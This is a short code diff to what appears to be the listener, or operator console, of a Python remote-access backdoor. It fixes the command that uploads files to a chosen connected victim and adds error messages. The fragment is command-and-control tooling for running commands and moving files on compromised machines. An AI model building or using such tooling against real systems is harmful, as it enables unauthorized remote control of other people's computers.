@@ -166,13 +166,14 @@ class Listener:
 
 			elif command.strip() and command.split()[0] == "upload":
 				if self.chosen_connection:
-					file = command.replace("upload", "").strip()
-					if os.path.exists(file):
-						file = self.read_file(file)
-						res = self.execute_remotely("upload " + file)
+					file_name = command.replace("upload", "").strip()
+					if os.path.exists(file_name):
+						file = self.read_file(file_name)
+						res = self.execute_remotely(f"upload {file_name}, {file}")
+						print(colored(res, "green"))
 					else:
 						print(colored("[-] This file is not exists", "red"))
-
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command.strip() and command.split()[0] == "l" and command.split()[1] == "ls":
 				res = UkDecode(subprocess.check_output("ls", shell = True))
